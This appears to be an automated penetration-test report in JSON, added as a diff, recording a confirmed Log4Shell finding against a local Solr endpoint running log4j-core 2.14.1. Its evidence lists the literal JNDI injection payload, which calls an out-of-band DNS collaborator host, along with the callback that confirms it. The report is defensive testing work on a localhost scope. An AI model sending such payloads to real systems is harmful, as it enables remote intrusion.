@@ -1,0 +1,62 @@
+{
+  "id": "bf1929bc-5cee-4f97-b2ba-69037bd151bb",
+  "engagement_name": "Capability-learning A",
+  "target_scope": [
+    "localhost",
+    "127.0.0.1"
+  ],
+  "test_start": "2026-07-21T05:38:20.372740Z",
+  "test_end": "2026-07-21T05:38:20.372740Z",
+  "generated_at": "2026-07-21T05:38:20.374097Z",
+  "executive_summary": {
+    "overview": "Penetration test of localhost, 127.0.0.1. 1 findings identified.",
+    "risk_rating": "Critical",
+    "critical_count": 1,
+    "high_count": 0,
+    "medium_count": 0,
+    "low_count": 0,
+    "info_count": 0,
+    "key_findings": [],
+    "recommendations": []
+  },
+  "hosts": [],
+  "findings": [
+    {
+      "id": "d81e7ef8-3548-4d91-85d6-0d7c49c51821",
+      "title": "Log4Shell RCE (CVE-2021-44228) via log-sink JNDI egress \u2014 action",
+      "description": "Technique: CVE-2021-44228 (Log4Shell) \u2014 JNDI message-lookup egress via a log sink. Parameter: action.",
+      "severity": "critical",
+      "status": "confirmed",
+      "target": "http://localhost:8983/solr/admin/cores",
+      "evidence": [
+        "Request: Log4Shell JNDI probe http://localhost:8983/solr/admin/cores \u2014 action=${jndi:dns://host.docker.internal:15353/ty5awcsxpfybbnw74hd6vdvvzy}",
+        "Response: out-of-band JNDI/dns callback bearing the probe nonce received (dns from 127.0.0.1)",
+        "class=log_interpolation (log4j-core message-lookup JNDI egress); confirmation=P6 out-of-band callback (no in-band signal by design)",
+        "candidate_param=action verification=verified-oob",
+        "confirmation=P6 target=${jndi:dns://host.docker.internal:15353/ty5awcsxpfybbnw74hd6vdvvzy} status=None",
+        "outbound_probe: GET http://localhost:8983/solr/admin/cores \u2014 action=${jndi:dns://host.docker.internal:15353/ty5awcsxpfybbnw74hd6vdvvzy}",
+        "callback_nonce='ty5awcsxpfybbnw74hd6vdvvzy' (carried only in the one outbound probe; control_bore_it=False)",
+        "confirming_excerpt: inbound callback: proto=dns src=127.0.0.1 host=ty5awcsxpfybbnw74hd6vdvvzy path= received_at=1784612284.326",
+        "control [fresh single-use nonce minted but never sent to the target \u2014 the collaborator recorded no callback for it (proves the confirming callback is genuine inbound traffic, not a fabricated event)] status=None"
+      ],
+      "cvss_score": null,
+      "cve_ids": [],
+      "references": [],
+      "remediation": "",
+      "discovered_at": "2026-07-21T05:38:04.577090Z",
+      "validated_at": null,
+      "discovery_provenance": {
+        "technology_key": "log4j-core",
+        "observed_version": "2.14.1",
+        "sink_shape_id": "log4j.log_sink",
+        "primitive_class": "log_interpolation",
+        "primitive_id": "log_interpolation.log4j_jndi",
+        "confirmation_primitive": "P6",
+        "reachability_grade": "static_heuristic",
+        "gating_config": "log4j2.formatMsgNoLookups"
+      }
+    }
+  ],
+  "methodology": "",
+  "appendices": {}
+}
